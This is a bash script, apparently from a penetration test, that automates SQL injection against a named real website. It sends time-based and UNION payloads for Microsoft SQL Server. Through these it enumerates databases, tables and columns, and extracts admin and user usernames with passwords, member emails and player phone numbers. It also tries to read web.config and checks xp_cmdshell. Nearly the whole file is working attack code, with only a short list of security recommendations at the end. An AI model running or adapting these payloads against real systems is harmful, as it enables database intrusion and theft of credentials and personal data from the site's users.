#!/bin/bash

# SQL Injection Data Extraction Script
# Team B - Panama8888b Penetration Test
# Target: https://member.panama8888b.com/public/js/v2/app.js

BASE_URL="https://member.panama8888b.com/public/js/v2/app.js"
OUTPUT_DIR="./extracted_data"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${GREEN}[+] SQL Injection Data Extraction Tool${NC}"
echo -e "${GREEN}[+] Target: $BASE_URL${NC}"
echo -e "${GREEN}[+] Output Directory: $OUTPUT_DIR${NC}"
echo "=================================================="

# Function to make SQL injection request
sql_inject() {
    local payload="$1"
    local description="$2"
    local output_file="$3"
    
    echo -e "${YELLOW}[*] $description${NC}"
    
    # URL encode the payload
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/(/%28/g' | sed 's/)/%29/g' | sed 's/=/%3D/g' | sed 's/'\''/%27/g')
    
    # Make the request
    curl -s -k -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         "${BASE_URL}?v=25.1${encoded_payload}" \
         -o "$OUTPUT_DIR/$output_file" \
         -w "Time: %{time_total}s | HTTP: %{http_code} | Size: %{size_download} bytes\n"
    
    # Show first few lines of response
    echo -e "${GREEN}[+] Response preview:${NC}"
    head -10 "$OUTPUT_DIR/$output_file" 2>/dev/null || echo "No readable content"
    echo "----------------------------------------"
}

# Test 1: Time-based injection verification
echo -e "${YELLOW}[*] Testing time-based SQL injection...${NC}"
start_time=$(date +%s.%N)
curl -s -k "${BASE_URL}?v=25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A3%27%20--" -o /dev/null
end_time=$(date +%s.%N)
elapsed=$(echo "$end_time - $start_time" | bc -l)
echo -e "${GREEN}[+] Time-based test completed in: ${elapsed}s${NC}"

# Test 2: Database version
sql_inject ")) UNION SELECT @@version --" "Getting database version" "db_version.txt"

# Test 3: Current database name
sql_inject ")) UNION SELECT DB_NAME() --" "Getting current database name" "db_name.txt"

# Test 4: Current user
sql_inject ")) UNION SELECT USER_NAME() --" "Getting current database user" "db_user.txt"

# Test 5: Server name
sql_inject ")) UNION SELECT @@servername --" "Getting server name" "server_name.txt"

# Test 6: List all databases
sql_inject ")) UNION SELECT name FROM master..sysdatabases --" "Getting all database names" "all_databases.txt"

# Test 7: List tables
sql_inject ")) UNION SELECT name FROM sysobjects WHERE xtype='U' --" "Getting table names" "table_names.txt"

# Test 8: List tables using INFORMATION_SCHEMA
sql_inject ")) UNION SELECT table_name FROM information_schema.tables --" "Getting table names (INFORMATION_SCHEMA)" "table_names_schema.txt"

# Test 9: Get columns from users table
sql_inject ")) UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --" "Getting columns from 'users' table" "users_columns.txt"

# Test 10: Get columns from admins table
sql_inject ")) UNION SELECT column_name FROM information_schema.columns WHERE table_name='admins' --" "Getting columns from 'admins' table" "admins_columns.txt"

# Test 11: Get columns from members table
sql_inject ")) UNION SELECT column_name FROM information_schema.columns WHERE table_name='members' --" "Getting columns from 'members' table" "members_columns.txt"

# Test 12: Get columns from players table
sql_inject ")) UNION SELECT column_name FROM information_schema.columns WHERE table_name='players' --" "Getting columns from 'players' table" "players_columns.txt"

# Test 13: Try to extract admin data
sql_inject ")) UNION SELECT username+CHAR(58)+password FROM admins --" "Extracting admin usernames and passwords" "admin_credentials.txt"

# Test 14: Try to extract user data
sql_inject ")) UNION SELECT username+CHAR(58)+password FROM users --" "Extracting user credentials" "user_credentials.txt"

# Test 15: Try to extract member data
sql_inject ")) UNION SELECT name+CHAR(58)+email FROM members --" "Extracting member information" "member_info.txt"

# Test 16: Try to extract player data
sql_inject ")) UNION SELECT code+CHAR(58)+phone FROM players --" "Extracting player information" "player_info.txt"

# Test 17: Count records in each table
echo -e "${YELLOW}[*] Counting records in tables...${NC}"
for table in users admins members players accounts customers; do
    sql_inject ")) UNION SELECT CAST(COUNT(*) AS VARCHAR)+CHAR(58)+'$table' FROM $table --" "Counting records in $table" "count_$table.txt"
done

# Test 18: Try to read configuration files (if permissions allow)
sql_inject ")) UNION SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) --" "Attempting to read web.config" "web_config.txt"

# Test 19: Try to get database configuration
sql_inject ")) UNION SELECT name+CHAR(58)+value_in_use FROM sys.configurations WHERE name LIKE '%xp_cmdshell%' --" "Checking xp_cmdshell configuration" "xp_cmdshell_config.txt"

# Test 20: Advanced information gathering
sql_inject ")) UNION SELECT SYSTEM_USER+CHAR(58)+@@VERSION --" "Getting system user and version" "system_info.txt"

# Summary
echo "=================================================="
echo -e "${GREEN}[+] Data extraction completed!${NC}"
echo -e "${GREEN}[+] Check the following files in $OUTPUT_DIR:${NC}"
ls -la "$OUTPUT_DIR"

echo ""
echo -e "${YELLOW}[*] Quick analysis of extracted data:${NC}"

# Check for successful extractions
if [ -f "$OUTPUT_DIR/admin_credentials.txt" ]; then
    echo -e "${GREEN}[+] Admin credentials file created${NC}"
    file_size=$(stat -c%s "$OUTPUT_DIR/admin_credentials.txt")
    echo "    File size: $file_size bytes"
fi

if [ -f "$OUTPUT_DIR/user_credentials.txt" ]; then
    echo -e "${GREEN}[+] User credentials file created${NC}"
    file_size=$(stat -c%s "$OUTPUT_DIR/user_credentials.txt")
    echo "    File size: $file_size bytes"
fi

if [ -f "$OUTPUT_DIR/table_names.txt" ]; then
    echo -e "${GREEN}[+] Table names file created${NC}"
    file_size=$(stat -c%s "$OUTPUT_DIR/table_names.txt")
    echo "    File size: $file_size bytes"
fi

echo ""
echo -e "${YELLOW}[*] To analyze the data further, check each file in the extracted_data directory${NC}"
echo -e "${YELLOW}[*] Look for JavaScript code patterns that might contain extracted database information${NC}"

# Create summary report
cat > "$OUTPUT_DIR/EXTRACTION_SUMMARY.md" << EOF
# SQL Injection Data Extraction Summary

## Target Information
- **URL:** $BASE_URL
- **Date:** $(date)
- **Method:** UNION-based SQL Injection
- **Database Type:** Microsoft SQL Server (confirmed)

## Files Generated
$(ls -la "$OUTPUT_DIR" | grep -v "^total" | grep -v "EXTRACTION_SUMMARY.md")

## Analysis Notes
1. Check each .txt file for extracted database information
2. Look for patterns in JavaScript responses that might contain SQL query results
3. Time-based injection confirmed - elapsed time: ${elapsed}s for 3-second delay
4. UNION-based injection attempted on multiple tables and system views

## Recommended Next Steps
1. Analyze extracted files for sensitive information
2. Use sqlmap for automated extraction if manual methods are insufficient
3. Test for additional SQL injection points in the application
4. Document all findings for the penetration test report

## Security Recommendations
1. Implement parameterized queries to prevent SQL injection
2. Apply input validation and sanitization
3. Use least privilege database access
4. Enable SQL injection protection (WAF)
5. Regular security code reviews
EOF

echo -e "${GREEN}[+] Summary report created: $OUTPUT_DIR/EXTRACTION_SUMMARY.md${NC}"
echo "=================================================="